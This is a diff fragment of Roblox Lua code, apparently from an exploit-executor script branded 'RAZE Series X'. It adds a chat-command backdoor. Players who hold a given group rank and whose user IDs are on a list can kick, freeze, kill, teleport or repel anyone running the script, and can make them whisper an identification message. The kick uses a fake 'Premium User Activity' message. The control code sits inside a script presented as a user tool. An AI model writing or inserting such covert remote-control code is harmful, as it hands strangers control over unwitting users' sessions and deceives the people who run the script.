+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (CurrentPlayer.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Unit * 10)
+                                end
+                            end)
+                            wait()
+                        end
+                    else
+                        Pls = Instance.new("Folder",game.workspace)
+                        Pls.Name = "Pls no Delete"
+                        Nam = Instance.new("Folder",game.workspace["Pls no Delete"])
+                        Nam.Name = CurrentPlayer.Name
+                        wait()
+                        while game:GetService("Workspace")["Pls no Delete"]:FindFirstChild(CurrentPlayer.Name) do
+                            pcall(function()
+                                if 15 >= (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CurrentPlayer.Character.HumanoidRootPart.Position).magnitude then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (CurrentPlayer.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Unit * 10)
+                                end
+                            end)
+                            wait()
+                        end
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."unblock ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[3])
+            local CurrentPlayer1 = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer1 == game.Players.LocalPlayer then
+                if CurrentPlayer ~= game.Players.LocalPlayer and CurrentPlayer ~= nil then
+                    if game.workspace:FindFirstChild("Pls no Delete") then
+                        for i,v in pairs(game.workspace["Pls no Delete"]:GetChildren()) do
+                            if v.Name == CurrentPlayer.Name then
+                                v:destroy()
+                            end
+                        end
+                    else
+                        Pls = Instance.new("Folder",game.workspace)
+                        Pls.Name = "Pls no Delete"
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."freeze ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                Froozen = game:GetService("RunService").RenderStepped:Connect(pcall(function()
+                    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                        if v:IsA("BasePart") then
+                            v.Anchored = true
+                        end
+                    end
+                end))
+                getgenv().Froozen = true
+            end
+        end
+        
+        if Message:lower():find(Prefix.."unfreeze ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                getgenv().Froozen = false
+                if Froozen then
+                    print("UnFroozen")
+                    Froozen:Disconnect()
+                end
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("BasePart") then
+                        v.Anchored = false
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."re ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                pcall(function()
+                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                end)
+            end
+        end
+
+        if Message:lower():find(Prefix.."bring ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                if Froozen then
+                    Froozen:Disconnect()
+                end
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("BasePart") then
+                        v.Anchored = false
+                    end
+                end
+                wait()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame
+                if getgenv().Froozen == true then
+                    Froozen = game:GetService("RunService").RenderStepped:Connect(pcall(function()
+                        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                            if v:IsA("BasePart") then
+                                v.Anchored = true
+                            end
+                        end
+                    end))
+                end
+            end
+        end
+        if Message:lower():find(Prefix.."tell") then
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Player.Name.." I Am a Fellow RAZE Series X User","All")
+        end
+    elseif Player:GetRankInGroup("16764778") == 1 and UserIds:find(Player.UserId) then
+        if Message:lower():find(Prefix.."kick ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                game.Players.LocalPlayer:kick("Premium User Activity | You Got Kicked By "..Player.Name)
+            end
+        end
+
+        if Message:lower():find(Prefix.."block ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[3])
+            local CurrentPlayer1 = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer1 == game.Players.LocalPlayer then
+                if CurrentPlayer ~= game.Players.LocalPlayer and CurrentPlayer ~= nil then
+                    if game.workspace:FindFirstChild("Pls no Delete") then
+                        Nam = Instance.new("Folder",game.workspace["Pls no Delete"])
+                        Nam.Name = CurrentPlayer.Name
+                        wait()
+                        while game:GetService("Workspace")["Pls no Delete"]:FindFirstChild(CurrentPlayer.Name) do
+                            pcall(function()
+                                if 15 >= (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CurrentPlayer.Character.HumanoidRootPart.Position).magnitude then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (CurrentPlayer.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Unit * 10)
+                                end
+                            end)
+                            wait()
+                        end
+                    else
+                        Pls = Instance.new("Folder",game.workspace)
+                        Pls.Name = "Pls no Delete"
+                        Nam = Instance.new("Folder",game.workspace["Pls no Delete"])
+                        Nam.Name = CurrentPlayer.Name
+                        wait()
+                        while game:GetService("Workspace")["Pls no Delete"]:FindFirstChild(CurrentPlayer.Name) do
+                            pcall(function()
+                                if 15 >= (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CurrentPlayer.Character.HumanoidRootPart.Position).magnitude then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (CurrentPlayer.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Unit * 10)
+                                end
+                            end)
+                            wait()
+                        end
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."unblock ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[3])
+            local CurrentPlayer1 = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer1 == game.Players.LocalPlayer then
+                if CurrentPlayer ~= game.Players.LocalPlayer and CurrentPlayer ~= nil then
+                    if game.workspace:FindFirstChild("Pls no Delete") then
+                        for i,v in pairs(game.workspace["Pls no Delete"]:GetChildren()) do
+                            if v.Name == CurrentPlayer.Name then
+                                v:destroy()
+                            end
+                        end
+                    else
+                        Pls = Instance.new("Folder",game.workspace)
+                        Pls.Name = "Pls no Delete"
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."freeze ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                Froozen = game:GetService("RunService").RenderStepped:Connect(pcall(function()
+                    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                        if v:IsA("BasePart") then
+                            v.Anchored = true
+                        end
+                    end
+                end))
+                getgenv().Froozen = true
+            end
+        end
+        
+        if Message:lower():find(Prefix.."unfreeze ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                getgenv().Froozen = false
+                if Froozen then
+                    print("UnFroozen")
+                    Froozen:Disconnect()
+                end
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("BasePart") then
+                        v.Anchored = false
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."re ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                pcall(function()
+                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                end)
+            end
+        end
+
+        if Message:lower():find(Prefix.."bring ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                if Froozen then
+                    Froozen:Disconnect()
+                end
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("BasePart") then
+                        v.Anchored = false
+                    end
+                end
+                wait()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame
+                if getgenv().Froozen == true then
+                    Froozen = game:GetService("RunService").RenderStepped:Connect(pcall(function()
+                        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                            if v:IsA("BasePart") then
+                                v.Anchored = true
+                            end
+                        end
+                    end))
+                end
+            end
+        end
+        if Message:lower():find(Prefix.."tell") then
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Player.Name.." I Am a Fellow RAZE Series X User","All")
+        end
+    end
+end)
